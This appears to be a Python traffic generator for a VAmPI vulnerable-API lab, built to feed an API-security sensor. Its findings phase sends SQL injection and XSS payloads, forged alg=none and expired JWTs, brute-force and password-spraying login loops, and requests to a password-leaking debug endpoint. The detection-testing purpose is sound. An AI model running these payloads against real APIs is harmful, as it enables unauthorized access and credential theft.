#!/usr/bin/env python3
"""
vampi_traffic.py
================
Traffic generator for a VAmPI lab instance monitored by an API-security sensor.

VAmPI (https://github.com/erev0s/VAMPI) is a deliberately vulnerable
"vulnerable-on-purpose" API. Point base_url at your own lab only.

All options live in a YAML config file (default: vampi_config.yaml).
Run with:
    python3 vampi_traffic.py                       # uses vampi_config.yaml
    python3 vampi_traffic.py --config other.yaml   # custom path

Phases (toggled in the config):
  warmup    - realistic, high-variety multi-consumer traffic (register ->
              login -> read/update) to advance the API through the learning
              period (build distinct-consumer count).
  findings  - detection patterns, split into three populations:
                authenticated    valid sessions (the known lab users)
                unauthenticated  no Authorization header at all / pre-auth
                bad-token        unsigned / expired / long-life JWTs

NOTE on tokens: VAmPI issues short-lived JWTs (this instance: 60 s). This
generator re-logins before every batch of authenticated calls, and re-logins
again on any 401, so short tokens are handled transparently.

Dependencies:  pip install requests pyyaml
"""

import argparse
import os
import random
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

import vampi_common as vm


def build_session():
    s = requests.Session()
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    retry = Retry(total=1, backoff_factor=0.1,
                  status_forcelist=[502, 503, 504], allowed_methods=None)
    s.mount("http://", HTTPAdapter(max_retries=retry, pool_maxsize=32))
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=32))
    return s


# ── Core requesters ───────────────────────────────────────────────────────────
def register(base, username, password, email, hdrs, tout):
    """POST /users/v1/register — register a fresh consumer account."""
    url = f"{base}/users/v1/register"
    payload = {"username": username, "password": password, "email": email}
    h = dict(hdrs or {})
    h["Content-Type"] = "application/json"
    try:
        r = requests.post(url, json=payload, headers=h, timeout=tout)
        return r.status_code
    except requests.RequestException:
        return "err"


def auth_call(base, method, path, username, password, hdrs, tout, **kw):
    """Issue an authenticated request, re-login once and retry on 401 (the
    token is short-lived). Returns the Response, or None on transport error."""
    tok = vm.login(base, username, password, hdrs, tout)
    if not tok:
        return None
    h = vm.auth_headers(tok, hdrs)
    try:
        r = requests.request(method, f"{base}{path}", headers=h, timeout=tout, **kw)
        if r.status_code == 401:                     # token expired mid-batch
            tok = vm.login(base, username, password, hdrs, tout)
            h = vm.auth_headers(tok, hdrs)
            r = requests.request(method, f"{base}{path}", headers=h, timeout=tout, **kw)
        return r
    except requests.RequestException:
        return None


# ── WARMUP: realistic multi-consumer traffic for the learning period ─────────
def one_consumer_journey(idx, base, tout):
    username = vm.rand_username("warm")
    email = vm.rand_email(username)
    pw = vm.rand_password()
    hdrs = vm.consumer_headers(idx)

    code = register(base, username, pw, email, hdrs, tout)
    vm.bump("warmup.register", code)

    # Fresh login; token is short-lived but the journey is a few quick calls.
    tok = vm.login(base, username, pw, hdrs, tout)
    vm.bump("warmup.login", "ok" if tok else "fail")
    if not tok:
        return

    h = vm.auth_headers(tok, hdrs)
    book = vm.rand_book_title("warm")
    try:
        def get(path):
            r = requests.get(f"{base}{path}", headers=h, timeout=tout)
            return r.status_code

        def post(path, payload):
            r = requests.post(f"{base}{path}", json=payload, headers={**h, "Content-Type": "application/json"}, timeout=tout)
            return r.status_code

        def put(path, payload):
            r = requests.put(f"{base}{path}", json=payload, headers={**h, "Content-Type": "application/json"}, timeout=tout)
            return r.status_code

        vm.bump("warmup.me", get("/me"))
        vm.bump("warmup.users", get("/users/v1"))
        vm.bump("warmup.own_user", get(f"/users/v1/{username}"))
        vm.bump("warmup.books_list", get("/books/v1"))
        vm.bump("warmup.book_add", post("/books/v1", {"book_title": book, "secret": vm.rand_password()}))
        vm.bump("warmup.own_book", get(f"/books/v1/{book}"))
        if idx % 5 == 0:
            vm.bump("warmup.email", put(f"/users/v1/{username}/email", {"email": f"{username}_new@mail.com"}))
    except requests.RequestException as e:
        vm.bump("warmup.error", str(type(e).__name__))


def run_warmup(count, threads, base, tout):
    print(f"[warmup] generating {count} distinct-consumer journeys ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(one_consumer_journey, i, base, tout) for i in range(count)]
        done = 0
        for _ in as_completed(futs):
            done += 1
            if done % 250 == 0:
                print(f"  ... {done}/{count} consumers")
    print("[warmup] complete")


# ── AUTHENTICATED population ──────────────────────────────────────────────────
def run_authenticated(users, rounds, base, tout):
    print(f"[authenticated] {len(users)} users x {rounds} round(s) ...")
    for r_ in range(rounds):
        for idx, u in enumerate(users):
            username = u["username"]
            pw = u["password"]
            hdrs = vm.consumer_headers(1000 + idx + r_ * len(users))
            book = vm.rand_book_title(f"a{r_}{idx}")
            r = auth_call(base, "GET", "/me", username, pw, hdrs, tout); vm.bump("auth.me", r.status_code if r else "no-token")
            r = auth_call(base, "GET", f"/users/v1/{username}", username, pw, hdrs, tout); vm.bump("auth.own_user", r.status_code if r else "no-token")
            r = auth_call(base, "GET", "/users/v1", username, pw, hdrs, tout); vm.bump("auth.users", r.status_code if r else "no-token")
            r = auth_call(base, "GET", "/books/v1", username, pw, hdrs, tout); vm.bump("auth.books_list", r.status_code if r else "no-token")
            r = auth_call(base, "POST", "/books/v1", username, pw, hdrs, tout, json={"book_title": book, "secret": vm.rand_password()}); vm.bump("auth.book_add", r.status_code if r else "no-token")
            r = auth_call(base, "GET", f"/books/v1/{book}", username, pw, hdrs, tout); vm.bump("auth.own_book", r.status_code if r else "no-token")


# ── UNAUTHENTICATED population ────────────────────────────────────────────────
def f_excessive_data_exposure(base, tout):
    """GET /users/v1/_debug returns every user's plaintext password."""
    r = requests.get(f"{base}/users/v1/_debug", headers=vm.consumer_headers(900), timeout=tout)
    vm.bump("unauth_debug", r.status_code)


def f_unauth_sensitive(base, tout, pool):
    """Authenticated-only endpoints hit with NO Authorization header."""
    others = [u for u in pool] or ["name1"]
    for path in ("/me", f"/users/v1/{others[0]}/password", f"/users/v1/{others[0]}",
                 "/books/v1/bookTitle10"):
        try:
            if path.endswith("/password"):
                r = requests.put(f"{base}{path}", json={"password": "x"},
                                 headers={**vm.consumer_headers(901), "Content-Type": "application/json"}, timeout=tout)
            else:
                r = requests.get(f"{base}{path}", headers=vm.consumer_headers(901), timeout=tout)
            vm.bump("unauth_sensitive", r.status_code)
        except requests.RequestException:
            vm.bump("unauth_sensitive", "err")


def f_sensitive_query_params(base, tout):
    """Sensitive values (username/password/token) in the query string."""
    qp = {"username": "victim", "password": "Secret123!",
          "token": vm.make_jwt("victim")}
    r = requests.post(f"{base}/users/v1/login", params=qp,
                      json={"username": qp["username"], "password": qp["password"]},
                      headers=vm.consumer_headers(905), timeout=tout)
    vm.bump("sensitive_query", r.status_code)
    r = requests.get(f"{base}/users/v1/{qp['username']}", params=qp,
                     headers=vm.consumer_headers(905), timeout=tout)
    vm.bump("sensitive_query", r.status_code)


def f_injection_reflection(base, tout):
    marker = "INJ" + uuid.uuid4().hex[:6]
    payloads = [f"<script>{marker}</script>", f"' OR '1'='{marker}",
                f"{marker}' UNION SELECT username,password FROM users --"]
    for p in payloads:
        # SQLi / XSS in the username path
        r = requests.get(f"{base}/users/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
        vm.bump("injection", r.status_code)
        # SQLi / XSS in the book title path
        r = requests.get(f"{base}/books/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
        vm.bump("injection", r.status_code)


def f_weak_password(base, tout):
    for pw in ("123", "password", "abc", "111111", "qwerty"):
        name = vm.rand_username("weak")
        code = register(base, name, pw, vm.rand_email(name), vm.consumer_headers(907), tout)
        vm.bump("weak_password", code)


def f_sqli_users(base, tout):
    """Classic VAmPI SQLi on GET /users/v1/{username}."""
    for q in ("' OR '1'='1", "' OR 1=1--", "1' OR '1'='1' --",
              "admin' UNION SELECT username,password,email,admin FROM users --"):
        r = requests.get(f"{base}/users/v1/{q}", headers=vm.consumer_headers(911), timeout=tout)
        vm.bump("sqli_users", r.status_code)


def f_tech_info_exposure(base, tout):
    r = requests.post(f"{base}/users/v1/login", data="{not:json,,}",
                      headers={**vm.consumer_headers(908), "Content-Type": "application/json"},
                      timeout=tout)
    vm.bump("tech_info", r.status_code)
    r = requests.post(f"{base}/users/v1/login",
                      json={"username": {"$ne": None}, "password": ["array"]},
                      headers=vm.consumer_headers(908), timeout=tout)
    vm.bump("tech_info", r.status_code)
    r = requests.post(f"{base}/users/v1/register", json={"username": 5, "password": {"x": 1}},
                      headers=vm.consumer_headers(908), timeout=tout)
    vm.bump("tech_info", r.status_code)


def f_excessive_single_user(base, intensity, tout, target):
    for i in range(40 * intensity):
        tok = vm.login(base, target, f"wrong{i}", vm.consumer_headers(909), tout)
        vm.bump("excessive_single", "ok" if tok else "fail")


def f_excessive_across_users(base, intensity, tout, pool_usernames):
    pool = list(pool_usernames) + [f"target{i}" for i in range(60)]
    for i in range(40 * intensity):
        name = pool[i % len(pool)]
        tok = vm.login(base, name, "Password123!", vm.consumer_headers(910 + i), tout)
        vm.bump("excessive_across", "ok" if tok else "fail")


def run_unauthenticated(base, tout, intensity, pool_usernames, brute_target):
    print("[unauthenticated] generating no-token + pre-auth patterns ...")
    f_excessive_data_exposure(base, tout)
    f_unauth_sensitive(base, tout, pool_usernames)
    f_sensitive_query_params(base, tout)
    f_injection_reflection(base, tout)
    f_weak_password(base, tout)
    f_sqli_users(base, tout)
    f_tech_info_exposure(base, tout)
    f_excessive_single_user(base, intensity, tout, brute_target)
    f_excessive_across_users(base, intensity, tout, pool_usernames)
    print("[unauthenticated] complete")


# ── BAD-TOKEN population ──────────────────────────────────────────────────────
def run_bad_tokens(base, tout, first_user):
    print("[bad-token] generating unsigned / expired / long-life JWTs ...")
    # unsigned (alg=none)
    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
    vm.bump("unsigned_jwt", r.status_code)
    r = requests.get(f"{base}/users/v1/{first_user}", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
    vm.bump("unsigned_jwt_user", r.status_code)
    r = requests.get(f"{base}/books/v1/bookTitle10", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
    vm.bump("unsigned_jwt_book", r.status_code)
    # expired
    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=-86400), vm.consumer_headers(902)), timeout=tout)
    vm.bump("expired_jwt", r.status_code)
    # long-life
    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=10 * 365 * 86400), vm.consumer_headers(903)), timeout=tout)
    vm.bump("longlife_jwt", r.status_code)
    # BOLA + bad token: read another user's record with a forged token
    r = requests.get(f"{base}/users/v1/name2", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(904)), timeout=tout)
    vm.bump("badauth_bola", r.status_code)


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="VAmPI lab traffic generator (config-driven)")
    ap.add_argument("--config", default="vampi_config.yaml",
                    help="path to the YAML config file (default: vampi_config.yaml)")
    args = ap.parse_args()

    # Allow running from the repo root or any CWD that contains the config.
    if not os.path.exists(args.config) and os.path.exists(os.path.join(os.path.dirname(__file__), args.config)):
        args.config = os.path.join(os.path.dirname(__file__), args.config)

    cfg = vm.load_config(args.config)
    base = vm.base_url(cfg)
    tout = vm.timeout(cfg)

    runc = cfg.get("run", {}) or {}
    do_warmup = bool(runc.get("warmup", False))
    do_findings = bool(runc.get("findings", False))

    wc = cfg.get("warmup", {}) or {}
    consumers = int(wc.get("consumers", 2500))
    threads = int(wc.get("threads", 16))

    fc = cfg.get("findings", {}) or {}
    auth_rounds = int(fc.get("auth_rounds", 3))
    intensity = int(fc.get("intensity", 1))
    brute_target = vm.brute_target(cfg)

    if not (do_warmup or do_findings):
        sys.exit("Nothing to do: set run.warmup and/or run.findings to true in the config.")

    print(f"config: {args.config}")
    print(f"target: {base}")
    start = time.time()
    timings = {}

    if do_warmup:
        t0 = time.time()
        run_warmup(consumers, threads, base, tout)
        timings["warmup"] = time.time() - t0

    if do_findings:
        t0 = time.time()
        users = vm.known_users(cfg)
        pool_usernames = vm.known_usernames(cfg)
        first_user = pool_usernames[0] if pool_usernames else "name1"
        run_authenticated(users, auth_rounds, base, tout)
        run_unauthenticated(base, tout, intensity, pool_usernames, brute_target)
        run_bad_tokens(base, tout, first_user)
        timings["findings"] = time.time() - t0

    vm.print_summary(timings, time.time() - start)


if __name__ == "__main__":
    main()
